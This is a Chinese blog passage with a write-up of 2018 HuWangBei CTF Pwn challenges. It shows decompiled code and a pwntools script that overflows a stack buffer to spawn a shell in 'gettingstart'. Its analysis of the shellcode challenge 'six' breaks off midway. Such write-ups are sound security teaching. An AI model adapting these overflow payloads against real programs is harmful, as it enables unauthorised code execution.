<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。">
<meta name="keywords" content="CTF,Pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="护网杯2018——WriteUp">
<meta property="og:url" content="http://sp4n9x.github.io/2018/10/26/护网杯2018——WriteUp/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006fbkm8gy1fwm0kqzi1ij30ei05qdg0.jpg">
<meta property="og:updated_time" content="2020-09-14T16:59:20.876Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="护网杯2018——WriteUp">
<meta name="twitter:description" content="好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006fbkm8gy1fwm0kqzi1ij30ei05qdg0.jpg">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>护网杯2018——WriteUp | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AVI/">AVI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELF/">ELF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap/">Heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFH/">LFH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PEB/">PEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEB/">TEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-护网杯2018——WriteUp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/26/护网杯2018——WriteUp/" class="article-date">
      <time datetime="2018-10-25T16:00:00.000Z" itemprop="datePublished">2018-10-26</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      护网杯2018——WriteUp
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。<br>这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。<br>尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。<br>还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。<br><a id="more"></a></p>
</blockquote>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h3><h4 id="0x00-file-amp-amp-checksec"><a href="#0x00-file-amp-amp-checksec" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file task_gettingStart_ktQeERc </span><br><span class="line">task_gettingStart_ktQeERc: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped</span><br><span class="line">$ checksec task_gettingStart_ktQeERc </span><br><span class="line">[*] &apos;/home/.../Desktop/gettingstart/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="0x01-运行程序，观察程序功能"><a href="#0x01-运行程序，观察程序功能" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./task_gettingStart_ktQeERc </span><br><span class="line">HuWangBei CTF 2018 will be getting start after 139968784619408 seconds...</span><br><span class="line">But Whether it starts depends on you.</span><br><span class="line">csjkomso</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure>
<h4 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，程序通过read()函数，向栈上的缓冲区复制了0x28字节的数据，然后判断<code>if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 )</code>,如果成立，输出<code>Try again!</code>并退出，不成立则执行<code>system(&quot;/bin/sh&quot;)</code>获得shell,所以只要让<code>v7=0x7FFFFFFFFFFFFFFFLL</code>和<code>v8=0.1</code>,则获得shell。我们往上看，buf起始地址在<code>rsp+10h</code>,v7起始地址在<code>rsp+28h</code>,v8起始地址在<code>rsp+30h</code>,缓冲区长度为0x28,所以刚好可以构造输入的数据，覆盖v7和v8。这里的关键是0.1在内存中的形式是什么。我们通过IDA的图形视图可以很方便的找到if判断部分的代码：</p>
<div align="left"><br>    <img src="http://ww1.sinaimg.cn/large/006fbkm8gy1fwm0kqzi1ij30ei05qdg0.jpg" alt="if判断结构"><br></div>

<p>双击qword_C10，可以跳转到如下所示位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000000BF6 aTryAgain       db &apos;Try again!&apos;,0       ; DATA XREF: main:loc_A8E↑o</span><br><span class="line">.rodata:0000000000000C01                 align 8</span><br><span class="line">.rodata:0000000000000C08 qword_C08       dq 7FEFFFFFFFFFFFFFh    ; DATA XREF: main+4D↑r</span><br><span class="line">.rodata:0000000000000C10 qword_C10       dq 3FB999999999999Ah    ; DATA XREF: main+EE↑r</span><br></pre></td></tr></table></figure>
<p>可以看到0.1在内存中的表示为<code>0x3FB999999999999Ah</code>，我们还可以编写一个测试程序，以Hex形式输出0.1的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llx\n"</span>, *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>虽然这道题保护全开，但是对于利用没有阻碍。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote('117.78.40.144', 32671)</span></span><br><span class="line">p = process(<span class="string">"./task_gettingStart_ktQeERc"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>emmmm这道题考察的主要是0.1在内存中的存储形式，具体的可以参考下面的链接。<br><a href="https://math.okstate.edu/people/yqwang/teaching/math5553_spring14/demo/0point1.pdf" target="_blank" rel="noopener">0.1 in double precision</a></p>
<h3 id="six"><a href="#six" class="headerlink" title="six"></a>six</h3><h4 id="0x00-file-amp-amp-checksec-1"><a href="#0x00-file-amp-amp-checksec-1" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file six</span><br><span class="line">six: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=426dd1b2aab668b73945b91d45568813be69b9c7, stripped</span><br><span class="line">$ checksec six</span><br><span class="line">[*] &apos;/home/.../Desktop/six/six&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>保护全部都开启了。</p>
<h4 id="0x01-观察程序行为"><a href="#0x01-观察程序行为" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./six</span><br><span class="line">Show Ne0 your shellcode:</span><br><span class="line">difjodkfoj</span><br><span class="line">Invalid shellcode!</span><br></pre></td></tr></table></figure>
<p>程序让我们输入一段shellcode，不正确则退出。</p>
<h4 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v3)(__int64, <span class="keyword">char</span> *); <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">  v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">  check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">  v5 = dest;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">  v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有两个自定义函数，经过分析函数功能，可以知道，第一个函数，也就是rand_mmap2()函数，随机分配了两块大小一样的内存块，不过所拥有的权限的不一样的。第二个函数是check_shellcode()，是对用户输入的shellcode进行格式检查，检查通过，则程序认为是有效的shellcode。下面我们进入这两个函数看一下,首先进入rand_mmap2()函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">rand_mmap2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 从/dev/urandom读取两个随机数，作为分配内存的起始地址</span></span><br><span class="line">  read(fd, &amp;buf, <span class="number">6u</span>LL);</span><br><span class="line">  read(fd, &amp;v3, <span class="number">6u</span>LL);</span><br><span class="line">  dest = mmap((v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);<span class="comment">// 分配第一块内存，权限为RWX</span></span><br><span class="line">  fake_stack = mmap((buf &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) + <span class="number">0x500</span>;<span class="comment">// 分配第二块内存，权限为RW</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过搜索，我们知道，此函数从/dev/urandom读取了两个随机数，分别作为将要分配的两块内存的起始地址。这里为什么是6个字节的地址呢，因为64bit的CPU只有48位地址总线，也就是6个字节，64bit的程序只能访问2^48大小的虚拟内存。然后，分配了两块大小为0x1000的内存块，第一块dest的权限为RWX,第二块fake_stack的权限为RW。</p>
<p>接下来，我们进入check_shellcode函数：</p>
